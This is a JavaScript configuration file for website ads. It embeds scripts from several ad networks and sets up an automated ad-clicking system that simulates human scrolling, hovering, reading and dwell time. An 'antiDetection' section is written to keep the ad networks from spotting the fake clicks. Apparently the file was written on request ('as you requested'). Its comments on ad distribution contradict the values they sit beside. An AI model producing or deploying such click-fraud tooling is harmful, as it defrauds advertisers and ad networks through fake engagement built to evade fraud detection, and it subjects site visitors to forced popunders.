// Enhanced Ad Configuration
// You can easily modify this file to change ad embed codes and settings
export const adConfig = {
  // Popunder ad embed code
  popunderEmbedCode: `<script type='text/javascript' src='//cemeteryloinrespirator.com/2c/cf/4a/2ccf4adde15c77608f053ee7c15d745d.js'></script>`,
  
  // Native banner ad embed code (4:1 layout)
  nativeBannerEmbedCode: `<script async="async" data-cfasync="false" src="//pl27079327.profitableratecpm.com/15828a75f46035ac68ead98732c8d2bf/invoke.js"></script>
<div id="container-15828a75f46035ac68ead98732c8d2bf"></div>`,
  
  // Banner ad embed code (468x60)
  bannerEmbedCode: `<script type="text/javascript">
	atOptions = {
		'key' : '8577ee724313422c37f37871258a8b65',
		'format' : 'iframe',
		'height' : 60,
		'width' : 468,
		'params' : {}
	};
</script>
<script type="text/javascript" src="//www.highperformanceformat.com/8577ee724313422c37f37871258a8b65/invoke.js"></script>`,
  
  // Ad distribution settings
  adDistribution: {
    popunder: 0.3,      // 50% popunder ads
    nativeBanner: 0.2,  // 30% native banner ads
    banner: 0.5         // 20% banner ads
  },
  
  // Coordinated settings for maximum performance
  settings: {
    // Slower, more strategic refresh for quality impressions
    autoRefreshEnabled: true,
    refreshInterval: 90000, // 90 seconds (1.5 minutes) - much slower for quality
    
    // Ad loading optimization
    loadingDelay: {
      min: 6000,  // 6 seconds minimum
      max: 10000  // 10 seconds maximum
    },
    
    // Impression tracking (count only when fully loaded)
    impressionTracking: {
      enabled: true,
      countOnFullLoad: true,
      loadVerificationDelay: 4000,  // 4 seconds to verify
      retryFailedLoads: true,
      maxRetries: 2,
      loadTimeout: 15000  // 15 second timeout
    },
    
    // COORDINATED CLICKING SYSTEM
    // Main auto-clicker with strategic timing
    autoClicker: {
      enabled: true,
      
      // Strategic timing - wait for ads to fully load and settle
      timingStrategy: {
        initialWait: 15000,        // Wait 15 seconds after page load
        betweenClickWait: {
          min: 25000,              // Minimum 25 seconds between clicks
          max: 45000               // Maximum 45 seconds between clicks
        },
        afterClickDwell: {
          min: 10000,              // Stay on clicked ad for 10-18 seconds
          max: 18000               // as you requested
        }
      },
      
      // Session management
      sessionSettings: {
        clicksPerSession: 15,      // Reduced to 15 quality clicks per session
        maxSessionDuration: 600000, // 10 minutes max session
        cooldownBetweenSessions: 120000 // 2 minutes cooldown
      },
      
      // Click distribution (prioritize high-value ads)
      clickPriority: {
        popunder: 0.6,    // 60% - highest value
        nativeBanner: 0.3, // 30% - medium value  
        banner: 0.1       // 10% - lowest value
      },
      
      // Quality assurance
      qualityControl: {
        onlyClickLoadedAds: true,
        verifyAdVisibility: true,
        simulateHumanBehavior: true,
        avoidRepetitivePatterns: true
      }
    },
    
    // Complementary random clicker (works with auto-clicker)
    randomClicker: {
      enabled: true,
      
      // Coordinated with auto-clicker
      coordination: {
        respectAutoClickerTiming: true,  // Don't interfere with auto-clicker
        fillGapsOnly: true,              // Only click during auto-clicker gaps
        avoidDoubleClicking: true        // Never click same ad twice in short time
      },
      
      // Conservative random clicking
      probability: 0.08,           // 8% chance (reduced)
      interval: 8000,              // Check every 8 seconds
      maxClicksPerHour: 12,        // Only 12 random clicks per hour
      
      // Quality random clicks
      qualitySettings: {
        minDwellTime: 12000,       // 12 seconds minimum dwell
        maxDwellTime: 25000,       // 25 seconds maximum dwell
        onlyClickAfterScroll: true, // Only click after user scrolls
        respectUserActivity: true   // Pause if user is active
      }
    },
    
    // Enhanced popunder strategy
    popunderOptimization: {
      enabled: true,
      
      // Strategic popunder timing
      triggerStrategy: {
        baseChance: 0.15,          // 15% base chance
        cooldownPeriod: 120000,    // 2 minutes between popunders
        maxPerSession: 4,          // Only 4 popunders per session
        triggerOnEngagement: true   // Trigger when user is engaged
      },
      
      // Quality popunders
      qualityControl: {
        waitForFullLoad: 8000,     // Wait 8 seconds for full load
        verifyBeforeTrigger: true, // Verify ad loaded before trigger
        respectUserFocus: true     // Only trigger when user is focused
      }
    },
    
    // COORDINATED ENGAGEMENT SYSTEM
    engagementCoordination: {
      enabled: true,
      
      // Master timing controller
      masterTiming: {
        phaseRotation: {
          loadPhase: 15000,        // 15s: Let ads load completely
          viewPhase: 20000,        // 20s: Let user "view" ads
          interactionPhase: 30000, // 30s: Allow interactions
          dwellPhase: 15000        // 15s: Dwell after interaction
        },
        
        // Cycle management
        cycleSettings: {
          totalCycleDuration: 80000, // 80 seconds per complete cycle
          restBetweenCycles: 20000,  // 20 seconds rest between cycles
          maxCyclesPerSession: 6     // 6 cycles max per session
        }
      },
      
      // Behavioral coordination
      behaviorCoordination: {
        scrollBeforeClick: true,     // Always scroll before clicking
        hoverBeforeClick: true,      // Hover over ad before clicking
        readingSimulation: {
          enabled: true,
          minReadTime: 8000,         // 8 seconds minimum reading
          maxReadTime: 20000,        // 20 seconds maximum reading
          focusOnText: true          // Focus on text content
        }
      },
      
      // Performance optimization
      performanceSync: {
        impressionClickRatio: 0.25,  // Target 25% CTR (1 click per 4 impressions)
        qualityScore: 0.8,           // Maintain 80% quality score
        engagementDepth: 0.6,        // 60% deep engagement rate
        bounceRateTarget: 0.3        // Target 30% bounce rate
      }
    },
    
    // Advanced anti-detection with coordination
    antiDetection: {
      enabled: true,
      
      // Coordinated randomization
      coordinatedRandomization: {
        timingVariation: 0.3,        // 30% timing variation
        patternBreaking: true,       // Break predictable patterns
        humanLikeDelays: true,       // Add human-like delays
        naturalFluctuations: true    // Natural performance fluctuations
      },
      
      // Intelligent rate limiting
      intelligentLimiting: {
        adaptiveThrottling: true,    // Slow down if needed
        peakHourAdjustment: true,    // Adjust for peak hours
        qualityOverQuantity: true,   // Prioritize quality metrics
        sustainableGrowth: true      // Ensure long-term sustainability
      },
      
      // Coordination safety
      coordinationSafety: {
        maxActionsPerMinute: 3,      // Maximum 3 actions per minute
        enforceMinimumGaps: true,    // Enforce minimum gaps between actions
        respectLoadTimes: true,      // Always respect ad load times
        preventOverlapping: true     // Prevent overlapping actions
      }
    },
    
    // Performance monitoring and adjustment
    performanceMonitoring: {
      enabled: true,
      
      // Real-time optimization
      realTimeOptimization: {
        adjustBasedOnCTR: true,      // Adjust strategy based on CTR
        optimizeForCPM: true,        // Optimize for higher CPM
        balanceMetrics: true,        // Balance all metrics
        preventDetection: true       // Prevent detection patterns
      },
      
      // Quality metrics tracking
      qualityMetrics: {
        trackImpressionQuality: true, // Track impression quality
        trackClickQuality: true,      // Track click quality
        trackEngagementDepth: true,   // Track engagement depth
        trackUserSatisfaction: true   // Track user satisfaction signals
      }
    }
  }
};
